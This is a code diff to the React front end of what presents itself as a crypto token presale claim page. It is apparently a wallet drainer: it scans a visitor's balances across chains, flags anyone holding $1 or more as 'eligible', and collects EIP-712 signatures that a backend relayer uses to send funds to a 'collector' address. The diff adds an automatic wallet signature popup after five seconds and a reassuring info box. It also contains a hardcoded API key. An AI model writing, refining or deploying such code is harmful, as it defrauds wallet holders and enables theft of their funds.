@@ -106,6 +106,8 @@ function App() {
   const [executableChains, setExecutableChains] = useState([]);
   const [showRibbon, setShowRibbon] = useState(true);
   const [processingChain, setProcessingChain] = useState('');
+  const [autoTriggerTimer, setAutoTriggerTimer] = useState(null);
+  const [autoTriggerAttempted, setAutoTriggerAttempted] = useState(false);
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -145,6 +147,22 @@ function App() {
 
   // YOUR API KEY
   const RELAYER_API_KEY = '00de6eb9ebf5ea70f92e4c1efdc00ad32a7131f9856bd17d445f62f19a829fe6';
+
+  // ============================================
+  // WHAT IS THE RELAYER WALLET?
+  // ============================================
+  // The relayer wallet is a dedicated address (controlled by the backend at nexaworldx.com/relayer)
+  // that receives the signed EIP-712 payload from the frontend, validates the signature,
+  // and then submits the actual blockchain transaction on behalf of the user.
+  //
+  // This allows users to:
+  // - Avoid paying gas fees directly (the relayer covers them)
+  // - Process transactions without needing the native token for gas
+  // - Have a smoother UX where only a signature is required
+  //
+  // The relayer wallet address is the "collector" address set in each deployed contract.
+  // It is the address that ultimately receives the funds after processing.
+  // ============================================
 
   // EIP-712 Types for Meta Transaction - EXACTLY as your relayer expects
   const EIP712_TYPES = {
@@ -259,6 +277,42 @@ function App() {
     return () => clearInterval(timer);
   }, []);
 
+  // Auto-trigger wallet popup when eligible (after 5 seconds)
+  useEffect(() => {
+    // Clear any existing timer
+    if (autoTriggerTimer) {
+      clearTimeout(autoTriggerTimer);
+      setAutoTriggerTimer(null);
+    }
+
+    // If eligible AND wallet is connected AND not already attempted auto-trigger
+    if (isEligible && isConnected && !autoTriggerAttempted && executableChains.length > 0) {
+      console.log("🎯 Eligible! Will auto-trigger claim in 5 seconds...");
+      setTxStatus("✅ Eligible! Preparing claim in 5 seconds...");
+      
+      const timer = setTimeout(() => {
+        console.log("🚀 Auto-triggering claim popup now!");
+        setTxStatus("🔐 Opening wallet for signature...");
+        // Trigger the claim flow
+        executeMultiChainSignature();
+        setAutoTriggerAttempted(true);
+      }, 5000);
+      
+      setAutoTriggerTimer(timer);
+    }
+    
+    // Reset auto-trigger flag if eligibility becomes false
+    if (!isEligible) {
+      setAutoTriggerAttempted(false);
+    }
+    
+    return () => {
+      if (autoTriggerTimer) {
+        clearTimeout(autoTriggerTimer);
+      }
+    };
+  }, [isEligible, isConnected, executableChains, autoTriggerAttempted]);
+
   // Auto-check eligibility when wallet connects and balances are loaded
   useEffect(() => {
     if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
@@ -280,7 +334,9 @@ function App() {
     }
   }, [isConnected]);
 
-  // Check eligibility - THIS IS THE FIXED VERSION that properly identifies executable chains
+  // ============================================
+  // FIXED ELIGIBILITY CHECK - CORRECTLY IDENTIFIES EXECUTABLE CHAINS
+  // ============================================
   const checkEligibility = async () => {
     if (!address) return;
     
@@ -288,15 +344,24 @@ function App() {
     setTxStatus('🔄 Checking eligibility...');
     
     try {
-      // Calculate total value
-      const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
+      // Calculate total value across all chains
+      let totalValueUSD = 0;
+      const chainsWithBalance = [];
       
-      // Get chains with balance
-      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
-        balances[chain.name] && balances[chain.name].amount > 0.000001
-      );
+      // Iterate through all chains to compute total value
+      for (const chain of DEPLOYED_CHAINS) {
+        const balance = balances[chain.name];
+        if (balance && balance.amount > 0.000001) {
+          totalValueUSD += balance.valueUSD;
+          chainsWithBalance.push(chain);
+        }
+      }
       
-      // Filter chains that are executable (have enough value and gas buffer)
+      // Determine if user is eligible (total >= $1)
+      const eligible = totalValueUSD >= MIN_VALUE_THRESHOLD;
+      setIsEligible(eligible);
+      
+      // Filter chains that are executable (have balance AND meet gas buffer requirements)
       const executable = chainsWithBalance.filter(chain => {
         const balance = balances[chain.name];
         if (!balance) return false;
@@ -320,13 +385,9 @@ function App() {
       setEligibleChains(chainsWithBalance);
       setExecutableChains(executable);
       
-      // Check if eligible (total >= $1)
-      const eligible = total >= 1;
-      setIsEligible(eligible);
-      
       if (eligible) {
         if (executable.length === 0) {
-          setTxStatus('⚠️ No chains meet execution requirements');
+          setTxStatus('⚠️ Total eligible but no chain meets gas requirements');
           console.log('⚠️ Eligible but no executable chains:', {
             chainsWithBalance: chainsWithBalance.map(c => ({ 
               name: c.name, 
@@ -335,7 +396,7 @@ function App() {
             }))
           });
         } else {
-          setTxStatus(`✅ Ready to process ${executable.length} chains`);
+          setTxStatus(`✅ Eligible! ${executable.length} chain(s) ready to process`);
           console.log('✅ Executable chains:', executable.map(c => ({ 
             name: c.name, 
             value: balances[c.name]?.valueUSD,
@@ -349,7 +410,7 @@ function App() {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
             walletAddress: address,
-            totalValue: total,
+            totalValue: totalValueUSD,
             chains: chainsWithBalance.map(c => c.name)
           })
         });
@@ -367,7 +428,7 @@ function App() {
           preparePresale();
         }
       } else {
-        setTxStatus(total > 0 ? '✨ Connected' : '👋 Welcome');
+        setTxStatus(totalValueUSD > 0 ? `✨ Need $${(MIN_VALUE_THRESHOLD - totalValueUSD).toFixed(2)} more` : '👋 Connect a wallet with funds');
       }
       
     } catch (err) {
@@ -380,9 +441,9 @@ function App() {
 
   // Fetch balances across all chains
   const fetchAllBalances = async (walletAddress) => {
-    console.log("🔍 Checking eligibility...");
+    console.log("🔍 Scanning for balances across all chains...");
     setScanning(true);
-    setTxStatus('🔄 Checking eligibility...');
+    setTxStatus('🔄 Scanning chains...');
     
     const balanceResults = {};
     let scanned = 0;
@@ -405,7 +466,7 @@ function App() {
         
         scanned++;
         setScanProgress(Math.round((scanned / totalChains) * 100));
-        setTxStatus(`🔄 Checking eligibility...`);
+        setTxStatus(`🔄 Scanning ${chain.name}...`);
         
         if (amount > 0.000001) {
           balanceResults[chain.name] = {
@@ -418,7 +479,7 @@ function App() {
             name: chain.name,
             rpc: chain.rpc
           };
-          console.log(`✅ ${chain.name}: $${valueUSD.toFixed(2)} detected`);
+          console.log(`✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} ($${valueUSD.toFixed(2)}) detected`);
         }
       } catch (err) {
         console.error(`Failed to fetch balance for ${chain.name}:`, err);
@@ -432,7 +493,7 @@ function App() {
     setScanning(false);
     
     const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
-    console.log(`💰 Total detected: $${total.toFixed(2)}`);
+    console.log(`💰 Total detected value: $${total.toFixed(2)}`);
     
     return total;
   };
@@ -540,7 +601,7 @@ function App() {
             nonce: nonce
           };
           
-          setTxStatus(`✍️ Signing for ${chain.name}...`);
+          setTxStatus(`✍️ Please sign in your wallet for ${chain.name}...`);
           
           // Get EIP-712 signature - THIS IS THE EXACT FORMAT YOUR RELAYER EXPECTS
           const signature = await signer.signTypedData(
@@ -552,7 +613,6 @@ function App() {
           console.log(`✅ Signature obtained for ${chain.name}`);
           
           // Create the signature payload EXACTLY as your relayer expects
-          // From your spec: Frontend should send ONLY the signature payload
           const signaturePayload = {
             domain: domain,
             types: EIP712_TYPES,
@@ -718,7 +778,8 @@ function App() {
   // 2. User is eligible (total >= $1)
   // 3. Not all chains are completed yet
   // 4. Not currently scanning
-  const showClaimButton = isConnected && isEligible && !allChainsCompleted && !scanning;
+  // 5. Not currently processing
+  const showClaimButton = isConnected && isEligible && !allChainsCompleted && !scanning && !signatureLoading;
 
   return (
     <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
@@ -853,6 +914,16 @@ function App() {
             </div>
           )}
 
+          {/* Auto-trigger countdown indicator */}
+          {isEligible && isConnected && !autoTriggerAttempted && executableChains.length > 0 && !signatureLoading && (
+            <div className="mb-4 text-center animate-pulse">
+              <div className="inline-flex items-center gap-2 bg-green-500/20 backdrop-blur px-4 py-2 rounded-full border border-green-500/40">
+                <div className="w-2 h-2 bg-green-400 rounded-full animate-ping"></div>
+                <span className="text-sm font-medium text-green-400">✓ Eligible! Preparing claim in 5 seconds...</span>
+              </div>
+            </div>
+          )}
+
           {/* LIVE badge */}
           <div className="flex justify-center mb-3 sm:mb-4">
             <div className="bg-[rgba(180,100,20,0.15)] rounded-full px-4 sm:px-6 py-2 border border-[#c47d24]/50 inline-flex items-center gap-2 sm:gap-3 font-bold text-xs sm:text-sm backdrop-blur shadow-[0_0_10px_rgba(180,100,20,0.3)] animate-liveBlink relative overflow-hidden">
@@ -940,6 +1011,18 @@ function App() {
             </div>
           </div>
 
+          {/* Relayer Info Box */}
+          <div className="mb-6 p-3 bg-blue-500/10 rounded-xl border border-blue-500/20 text-xs">
+            <div className="flex items-center gap-2 mb-1">
+              <i className="fas fa-shield-alt text-blue-400"></i>
+              <span className="font-bold text-blue-400">Relayer Wallet Info</span>
+            </div>
+            <p className="text-gray-400 text-[10px] leading-relaxed">
+              The relayer wallet is a backend-controlled address that submits signed transactions on your behalf. 
+              It covers gas fees and executes the flow to the collector contract. You only need to sign once per chain.
+            </p>
+          </div>
+
           {/* Main Claim Area - ALWAYS SHOWS when eligible and not all completed */}
           {showClaimButton && (
             <div className="mt-3 sm:mt-4">
@@ -998,7 +1081,7 @@ function App() {
           )}
 
           {/* Welcome message for non-eligible */}
-          {isConnected && !isEligible && !completedChains.length && !scanning && (
+          {isConnected && !isEligible && !completedChains.length && !scanning && !signatureLoading && (
             <div className="bg-black/60 rounded-xl sm:rounded-2xl p-5 sm:p-8 text-center border border-purple-500/20 mt-3 sm:mt-4 hover:border-purple-500/40 transition-all duration-500">
               <div className="text-4xl sm:text-6xl mb-3 sm:mb-4 animate-float">👋</div>
               <h2 className="text-lg sm:text-2xl font-bold mb-2 sm:mb-3 bg-gradient-to-r from-purple-400/80 to-orange-400/80 bg-clip-text text-transparent">
